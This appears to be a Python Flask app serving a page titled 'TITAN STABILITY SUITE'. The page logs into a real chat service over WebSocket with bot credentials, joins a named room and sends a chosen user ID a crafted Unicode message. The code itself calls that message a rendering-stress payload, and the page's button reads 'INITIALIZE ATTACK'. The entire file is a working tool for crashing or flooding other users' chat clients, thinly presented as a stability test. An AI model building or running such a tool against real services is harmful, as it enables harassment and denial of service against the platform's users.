import os
from flask import Flask, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN STABILITY SUITE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --cyan: #00f3ff; --red: #ff003c; }
        body { background: #020202; color: var(--cyan); font-family: monospace; text-align: center; padding: 20px; }
        .card { border: 2px solid var(--cyan); padding: 20px; border-radius: 10px; background: rgba(0,243,255,0.05); max-width: 400px; margin: auto; box-shadow: 0 0 20px rgba(0,243,255,0.2); }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #333; color: var(--cyan); box-sizing: border-box; border-radius: 4px; }
        label { font-size: 10px; color: #888; display: block; text-align: left; margin-top: 10px; }
        .status-box { background: #000; border: 1px solid #222; height: 120px; overflow-y: auto; text-align: left; padding: 10px; font-size: 11px; margin-top: 15px; color: #0f0; border-radius: 4px; }
        button { background: transparent; border: 1px solid var(--cyan); color: var(--cyan); padding: 15px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; transition: 0.3s; text-transform: uppercase; }
        button:hover { background: var(--cyan); color: #000; box-shadow: 0 0 20px var(--cyan); }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="letter-spacing:3px;">TITAN OS v21</h2>
        
        <label>AUTHENTICATION</label>
        <input type="text" id="bot_user" placeholder="Bot Username">
        <input type="password" id="bot_pass" placeholder="Bot Password">
        
        <label>TARGETING SYSTEM</label>
        <input type="text" id="target_room" placeholder="Room Name (e.g. american)">
        <input type="text" id="target_id" placeholder="Target User ID (Your ID)">
        
        <button onclick="executeTest()">INITIALIZE ATTACK</button>
        
        <div id="log" class="status-box">SYSTEM STANDBY...</div>
    </div>

    <script>
        function log(m) {
            const l = document.getElementById('log');
            l.innerHTML += "<div>[" + new Date().toLocaleTimeString().split(' ')[0] + "] " + m + "</div>";
            l.scrollTop = l.scrollHeight;
        }

        function executeTest() {
            const u = document.getElementById('bot_user').value;
            const p = document.getElementById('bot_pass').value;
            const r = document.getElementById('target_room').value;
            const t = document.getElementById('target_id').value;

            if(!u || !p || !t) { alert("All fields are required!"); return; }

            log("Attempting Connection...");
            const ws = new WebSocket("wss://chatp.net:5333/server");

            ws.onopen = () => {
                log("Socket Open. Sending Credentials...");
                ws.send(JSON.stringify({
                    handler: "login",
                    id: Math.random(),
                    username: u,
                    password: p
                }));
            };

            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                
                if(data.handler === "login_event" && data.type === "success") {
                    log("Login Success! Joining " + r);
                    ws.send(JSON.stringify({handler: "room_join", id: Math.random(), name: r}));
                }

                if(data.handler === "room_event" && data.type === "room_joined") {
                    log("In Room. Firing Payload at " + t);
                    
                    // Complex Unicode Payload (Rendering Stress)
                    const stressBody = "జ్ఞా" + " ҉ ".repeat(15) + "ဪ".repeat(5);

                    ws.send(JSON.stringify({
                        handler: "chat_message",
                        to: t,
                        type: "text",
                        body: stressBody
                    }));
                    log("STABILITY PACKET DELIVERED!");
                    setTimeout(() => ws.close(), 1500);
                }
                
                if(data.type === "error") log("ERROR: " + data.message);
            };

            ws.onclose = () => log("Connection Closed.");
            ws.onerror = () => log("Critical Connection Error!");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
